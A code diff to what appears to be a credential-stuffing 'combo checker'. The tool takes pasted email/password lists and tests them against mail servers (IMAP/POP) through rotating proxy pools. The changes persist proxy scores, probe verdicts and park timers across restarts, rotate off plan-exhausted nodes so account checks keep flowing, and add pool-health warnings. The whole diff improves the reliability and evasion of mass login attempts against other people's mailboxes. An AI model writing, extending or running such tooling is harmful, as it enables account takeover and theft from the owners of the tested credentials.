@@ -4110,6 +4110,127 @@ def load_json(path, default=None):
 domain_cache = load_json(live_cfg().get("CACHE_FILE", "domain_cache.json"), {})
 proxy_meta = _user_state()["proxy_meta"]
 
+# ==========================================================================
+# v13.64 - THE META FILE WAS WRITE-ONLY
+#
+# save_proxy_meta() has always written proxy_meta.json and NOTHING has ever read
+# it back. Every score, every country, every "this node has delivered before"
+# success count and every park died with the process - so a refresh handed the
+# engine a table of blank rows at the 80 default, and the "a node that ever
+# passed is never dropped by score" rescue in block 058 could not fire because
+# nothing on disk was ever loaded.
+#
+# The same file now also carries the last probe verdict per node and the park
+# clock, because the tier gate in block 069 reads probe_stats - and probe_stats
+# was memory-only too. Without them a reload re-flattens the pool until the
+# first probe cycle finishes, which is the exact "my pool resets itself" symptom.
+#
+# THREE RULES, and they are the whole safety of this:
+#   1. LIVE WINS. A field already in the table is never overwritten.
+#   2. THE FILE IS FILTERED ON READ. Only lines still in this user's proxies.txt
+#      are restored, so a stale file cannot resurrect a deleted node.
+#   3. A SEEDED VERDICT AGES OUT. After _PROBE_SEED_TTL the reason is dropped
+#      (the score, country and counters stay) so a week-old "ok" cannot pin a
+#      node above a fresh measurement for ever.
+# ==========================================================================
+_PROXY_META_SCHEMA = 2
+_PROBE_SEED_TTL = 6 * 3600.0
+
+
+def _proxy_meta_path() -> str:
+    """This user's own meta file. Never bare, even before CFG exists."""
+    try:
+        return live_cfg().get("PROXY_META_FILE") or user_file("proxy_meta.json")
+    except Exception:
+        return user_file("proxy_meta.json")
+
+
+def _load_proxy_meta_file() -> int:
+    """Restore scores, countries, counters, verdicts and parks. Once per scope."""
+    _scope = _gate_scope()
+    _done = STATE.setdefault("proxy_meta_loaded", set())
+    if _scope in _done:
+        return 0
+    _done.add(_scope)
+
+    _path = _proxy_meta_path()
+    if not os.path.exists(_path):
+        return 0
+    try:
+        with open(_path, encoding="utf-8") as f:
+            data = json.load(f)
+    except Exception as e:
+        log_startup(f"WARNING: {os.path.basename(_path)} unreadable ({e}); "
+                    f"starting from a cold table.")
+        return 0
+    if not isinstance(data, dict):
+        return 0
+
+    # New envelope, or the legacy flat dict written by every build before this one.
+    if isinstance(data.get("meta"), dict):
+        meta_in = data.get("meta") or {}
+        probe_in = data.get("probe") if isinstance(data.get("probe"), dict) else {}
+        park_in = data.get("parked") if isinstance(data.get("parked"), dict) else {}
+    else:
+        meta_in, probe_in, park_in = data, {}, {}
+
+    try:
+        known = set(load_proxies(quiet=True))
+    except Exception:
+        known = set()
+
+    now = time.time()
+    restored = 0
+    with proxy_lock:
+        for _p, _m in meta_in.items():
+            if not isinstance(_m, dict) or not _p:
+                continue
+            if known and _p not in known:
+                continue
+            _tgt = proxy_meta.setdefault(_p, {})
+            for _k in ("fails", "success", "plan", "latency_ms", "country", "region",
+                       "score"):
+                if _k not in _tgt and _k in _m:
+                    _tgt[_k] = _m[_k]
+            restored += 1
+
+    seeded = 0
+    with probe_stats_lock:
+        for _p, _r in probe_in.items():
+            if not isinstance(_r, dict) or not _p or _p in probe_stats:
+                continue
+            if known and _p not in known:
+                continue
+            try:
+                _ts = float(_r.get("ts") or 0.0)
+            except Exception:
+                _ts = 0.0
+            if not _ts or (now - _ts) > _PROBE_SEED_TTL:
+                continue
+            probe_stats[_p] = dict(_r)
+            seeded += 1
+
+    parks = 0
+    for _p, _until in park_in.items():
+        try:
+            _u = float(_until)
+        except Exception:
+            continue
+        if _u > now and (not known or _p in known):
+            proxy_407_until[_p] = _u
+            parks += 1
+
+    log_startup(f"Restored {restored} node record(s), {seeded} probe verdict(s) and "
+                f"{parks} park(s) from {os.path.basename(_path)} "
+                f"(live values kept).", quiet=True)
+    if seeded:
+        log_probe_event(f"pool state restored from disk: {seeded} verdict(s) - the "
+                        f"tier gate is live before the first probe")
+    return restored
+
+
+_load_proxy_meta_file()
+
 
 def _proxy_path() -> str:
     try:
@@ -4195,9 +4316,15 @@ def parse_proxy(proxy_str):
     return None
 
 
+# v13.64: BOTH OF THESE ARE CALLED FROM WORKER THREADS - quarantine_proxy() from
+# the probe pool and from the sweep, proxy_is_quarantined() from sample_alive_proxy
+# and from every rung. Module globals are ONE namespace for the whole process and
+# a rerun in another tab rebinds them, so without _rebind_scope() a worker could
+# read the other user's quarantine set - and quarantine a node into it.
 def proxy_is_quarantined(proxy_str) -> bool:
     if not proxy_str:
         return False
+    _rebind_scope()
     with proxy_quarantine_lock:
         return proxy_str in proxy_quarantine
 
@@ -4205,6 +4332,7 @@ def proxy_is_quarantined(proxy_str) -> bool:
 def quarantine_proxy(proxy_str, reason=""):
     if not proxy_str:
         return False
+    _rebind_scope()
     with proxy_quarantine_lock:
         if proxy_str in proxy_quarantine:
             return False
@@ -4224,6 +4352,7 @@ def quarantine_size() -> int:
 
 
 def clear_proxy_quarantine():
+    _rebind_scope()
     with proxy_quarantine_lock:
         proxy_quarantine.clear()
     _proxy_407.clear()
@@ -4960,11 +5089,43 @@ def save_domain_cache():
 
 
 def save_proxy_meta():
+    """Persist scores, countries, counters AND the last probe verdict, atomically.
+
+    v13.64: this wrote proxy_meta.json and NOTHING ever read it back - so every
+    score, every country and every "this node has delivered" count died with the
+    process, and block 052 had nothing to restore. It is a VERSIONED ENVELOPE now
+    and it carries three things:
+
+        meta    the score table, unchanged in shape
+        probe   the last verdict per node, so the tier gate in block 069 is live
+                again before the first probe of a new process finishes
+        parked  the 407 / 402 park clock, so a spent node stays parked
+
+    Written to a .tmp and os.replace()d, so a teardown mid-write cannot hand
+    block 052 a half file. Only keys that are IN the table are written, so the
+    payload cannot grow past the pool. Block 052 reads both this shape and the
+    old flat dict.
+    """
+    _path = _proxy_meta_path()
+    _tmp = _path + ".tmp"
     try:
         with file_write_lock:
             with proxy_lock:
-                with open(live_cfg()["PROXY_META_FILE"], "w", encoding="utf-8") as f:
-                    json.dump(proxy_meta, f, indent=2)
+                _meta = dict(proxy_meta)
+            with probe_stats_lock:
+                _probe = {k: dict(v) for k, v in probe_stats.items() if k in _meta}
+            _now = time.time()
+            try:
+                _parked = {k: v for k, v in proxy_407_until.items()
+                           if v > _now and k in _meta}
+            except Exception:
+                _parked = {}
+            payload = {"schema": _PROXY_META_SCHEMA,
+                       "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                       "meta": _meta, "probe": _probe, "parked": _parked}
+            with open(_tmp, "w", encoding="utf-8") as f:
+                json.dump(payload, f, indent=1)
+            os.replace(_tmp, _path)
     except Exception as e:
         warnings.warn(f"Failed to save proxy meta: {e}")
 
@@ -8339,15 +8500,19 @@ with str_lit.sidebar:
 
     _p_ok, _p_auth, _p_plan, _p_to, _p_dead = probe_summary()
 
-    # FIX ISO-4: _any_run_active(), not STATE["run_active"] - the bool used to be
-    # cleared by whichever run ended first, so one user's exit hid another user's
-    # live run and this banner claimed READY mid-run.
+    # FIX ISO-4: the bool used to be cleared by whichever run ended first, so one
+    # user's exit hid another user's live run and this banner claimed READY
+    # mid-run.
+    # FIX ISO-6: the count is PER USER now. _any_run_active() answers for the whole
+    # process, so a second user's page said "a run is live" - and stayed silent -
+    # while only the first user was checking anything, and the reverse. The owner's
+    # own count is the only correct answer here.
     # FIX UI-4: "N validated node(s) armed" was a lie when NONE passed the probe,
     # and len(alive_pool) is not the same number as the nodes the engine may use -
     # report the probe-pass count so the banner cannot overstate the pool.
     # FIX PLAN-1: 402 used to be reported as a 407 and read as a dead pool. It is
     # the provider refusing service on nodes that are alive and authenticated.
-    if _alive_now and not _any_run_active():
+    if _alive_now and int(_US.get("runs_active", 0)) <= 0:
         if _p_ok:
             _rtxt = (f"✅ READY - **{_p_ok}** validated node(s) armed. "
                      f"Paste your combos and press 🔥 Start Live Checking Engine. "
@@ -8389,8 +8554,12 @@ with str_lit.sidebar:
         _ms = {}
     if _ms.get("n"):
         _ms_age = int(time.time() - _ms.get("ts", 0))
+        # FIX PLAN-1: the 402 count has its own column. It used to be folded into
+        # `other`, so a wholly spent plan produced pass=0 / 407=0 / other=3 and the
+        # banner below - which only ever looked at `auth` - said nothing at all.
         _ms_txt = (f"Mail-destination spot check ({_ms['host']}:{_ms['port']}): "
-                   f"pass **{_ms['ok']}** | 407 **{_ms['auth']}** | other **{_ms['other']}** "
+                   f"pass **{_ms['ok']}** | 407 **{_ms['auth']}** | "
+                   f"402 **{_ms.get('plan', 0)}** | other **{_ms['other']}** "
                    f"/ {_ms['n']} node(s), {_ms_age}s ago")
         if _ms.get("auth") and not _ms.get("ok"):
             if _p_ok:
@@ -8407,6 +8576,17 @@ with str_lit.sidebar:
             # stamping FAILED onto Reset Display Fit.
             _mfull = "🚨 " + _ms_txt + " - " + _mtail
             (str_lit.caption if _steal else str_lit.error)(_mfull)
+        elif _ms.get("plan") and not _ms.get("ok"):
+            # v13.64: a plan-refused mail destination is neither a dead node nor a
+            # credential problem, and it used to fall into the plain caption with
+            # nothing said about it.
+            _mfull = ("⚠ " + _ms_txt + " - every sampled node answered **402 Payment "
+                      "Required** on the MAIL destination. The nodes authenticate and "
+                      "are alive; the plan's bandwidth is spent, so those attempts can "
+                      "never reach a mailbox. Set **Proxy Mode Engine = off** (DIRECT) "
+                      "until it resets, or expect every account to fall through to "
+                      "DIRECT on its own.")
+            (str_lit.caption if _steal else str_lit.warning)(_mfull)
         else:
             str_lit.caption(_ms_txt)
 
@@ -8431,7 +8611,8 @@ with str_lit.sidebar:
     str_lit.caption(
         f"407 contract: quarantine after **{PROXY_407_QUARANTINE}** strikes · "
         f"force DIRECT after **{PROXY_407_FORCE_DIRECT}** in a rung · "
-        f"park **{PROXY_407_COOLDOWN:.0f}s** · "
+        f"park **{PROXY_407_COOLDOWN:.0f}s** · 402 park "
+        f"**{PROXY_PLAN_PARK:.0f}s** · "
         f"same-host retries **{CFG.get('SAME_HOST_RETRIES')}** · "
         f"legacy 143/110 leash **{LEGACY_RUNG_TIMEOUT:.0f}s**"
     )
@@ -8560,6 +8741,10 @@ with str_lit.sidebar:
                          f"{_msr['auth']}/{_msr['n']} sampled node(s) against "
                          f"{_msr['host']}:{_msr['port']} - set **Proxy Mode Engine = off** "
                          f"until it resets.")
+            elif _msr.get("plan") and not _msr.get("ok"):
+                _msg += (f"  ⚠ ...and the MAIL-destination spot check answered 402 on "
+                         f"{_msr['plan']}/{_msr['n']} sampled node(s) - alive, out of "
+                         f"bandwidth. Set **Proxy Mode Engine = off** until it resets.")
             str_lit.session_state["_proxy_flash"] = ("success", _msg)
         else:
             str_lit.session_state["_proxy_flash"] = (
@@ -8716,6 +8901,7 @@ with str_lit.sidebar:
                     "Fails": meta.get("fails", 0),
                     "Successes": meta.get("success", 0),
                     "407s": _proxy_407.get(p_str, 0),
+                    "402s": meta.get("plan", 0),
                     "Parked": "yes" if _proxy_407_parked(p_str) else "",
                     "Attempts": _ps.get("attempts", 0),
                     "Last Probe": _last,
@@ -11290,14 +11476,25 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                         except ProxyPlanError as pln:
                             # FIX PLAN-1: 402 is the provider refusing SERVICE on a
                             # node that is alive and authenticated. It is not the
-                            # node, not the password, and not a network fault, so it
-                            # advances the rung without rotating or striking.
+                            # node, not the password, and not a network fault.
                             #
                             # v13.54: IT ALSO SETS saw_plan. Nothing else here was
                             # set by a 402, so a wholly 402 proxy phase looked like a
                             # clean run with no answer: block 103's direct_reason
                             # stayed false, the DIRECT sweep was skipped, and the
                             # account fell through to the generic tail as FAILED.
+                            #
+                            # v13.64: IT NOW ROTATES INSTEAD OF ADVANCING. The node
+                            # is parked for PROXY_PLAN_PARK by record_proxy_attempt,
+                            # but advancing the rung with the SAME spent node was
+                            # still wrong: the CONNECT never gets through, so every
+                            # later rung on that node is guaranteed to answer 402 too
+                            # and the whole ladder was burned on one spent sub-user.
+                            # A 402 is per SUB-USER, not per provider - another node
+                            # is very often on a sub-user that still has bandwidth,
+                            # so the rotation is a real chance at a real answer.
+                            # It costs nothing when the whole plan is spent: the
+                            # rotation simply fails and the rung advances as before.
                             err_text = str(pln)
                             flags["saw_nonproxy"] = True
                             flags["saw_plan"] = True
@@ -11305,9 +11502,10 @@ def _check_account_core(email, password, conf, domain, proxy_pool, thread_state,
                             trace_logs.append(
                                 f"{px_tag(px_used)} -> PROVIDER REFUSING SERVICE {proto} "
                                 f"{server}:{port}: {err_text[:140]} "
-                                f"[402 plan/bandwidth - node kept, advancing]")
+                                f"[402 plan/bandwidth - node parked "
+                                f"{PROXY_PLAN_PARK:.0f}s, rotating]")
                             server_level_fail = True
-                            rotate_now = False
+                            rotate_now = True
 
                         except ProxyPortBlocked as pblk:
                             # FIX 407-SCOPE: 403 means the provider refuses this
@@ -12087,12 +12285,43 @@ if start_engine_btn:
             log_probe_event("start: pool warm, target changed -> background refresh, "
                             "run starts immediately")
 
+        # ---- THE ARMED POOL, AND IT SAYS WHAT IT ARMED -----------------------
+        # FIX PLAN-2 (v13.64): the pool was copied wholesale and the run began
+        # without a word about its composition, so a pool that was half spent read
+        # exactly like a healthy one until the first account's ladder collapsed into
+        # DIRECT. _pool_tiers() is the same three-tier split block 069 draws from:
+        # A passed, B 402-only, C everything else. The counts are logged and a
+        # plan-only pool warns BEFORE the first account is submitted.
+        _armed_plan = 0
         if alive_pool:
             active_proxy_pool = list(alive_pool)
+            _tier_a, _tier_b, _tier_c = _pool_tiers(active_proxy_pool)
+            _armed_plan = len(_tier_b)
+            log_startup(
+                f"ARMED POOL -> {len(_tier_a)} node(s) passed the probe, "
+                f"{_armed_plan} kept only because they answered 402 (drawn last), "
+                f"{len(_tier_c)} other; {len(active_proxy_pool)} armed of "
+                f"{len(filtered_pool)} filtered / {len(all_proxies)} loaded."
+            )
+            if _armed_plan and not _tier_a:
+                status_text.warning(
+                    f"⚠ Every one of the {len(active_proxy_pool)} armed node(s) last "
+                    f"answered 402 Payment Required. They are alive and authenticate, so "
+                    f"each account tries them first and then falls through to DIRECT - "
+                    f"which costs ladder time. Proxy Mode Engine = off finishes the run "
+                    f"faster while the plan is spent.")
+            elif _armed_plan:
+                status_text.info(
+                    f"ℹ {_armed_plan} of the {len(active_proxy_pool)} armed node(s) last "
+                    f"answered 402 and are drawn only when no passing node is free.")
         elif CFG.get("PROBE_STRICT", PROBE_STRICT_DEFAULT):
             active_proxy_pool = []
+            log_startup("ARMED POOL -> empty: STRICT is on and no node passed the probe. "
+                        "Every account runs DIRECT.")
         else:
             active_proxy_pool = list(filtered_pool)
+            log_startup(f"ARMED POOL -> empty pool with STRICT OFF, so the {len(active_proxy_pool)} "
+                        f"filtered line(s) are armed UNVALIDATED.")
 
         log_startup(
             f"PROXY HEALTH BANNER -> loaded={len(all_proxies)} filtered={len(filtered_pool)} "
@@ -12111,6 +12340,17 @@ if start_engine_btn:
                 f"itself failed and the credential/plan is the problem, 'auth_dest' means "
                 f"the node is fine and only the mail port is refused. Either way the "
                 f"passwords are untested - set **Proxy Mode Engine = off** (DIRECT)."
+            )
+        elif _msr.get("plan") and not _msr.get("ok") and _msr.get("n"):
+            # v13.64: the 402 case had no start-path banner at all.
+            str_lit.warning(
+                f"⚠ **The mail-destination spot check answered 402 Payment Required on "
+                f"{_msr['plan']}/{_msr['n']} sampled node(s)** against "
+                f"{_msr['host']}:{_msr['port']}. Those nodes are alive and authenticate; "
+                f"the plan's bandwidth is spent, so a proxy attempt cannot reach a "
+                f"mailbox. The run continues and every account falls through to DIRECT "
+                f"on its own - set **Proxy Mode Engine = off** to skip the wasted proxy "
+                f"phase entirely."
             )
         if all_proxies and not alive_pool:
             str_lit.warning(
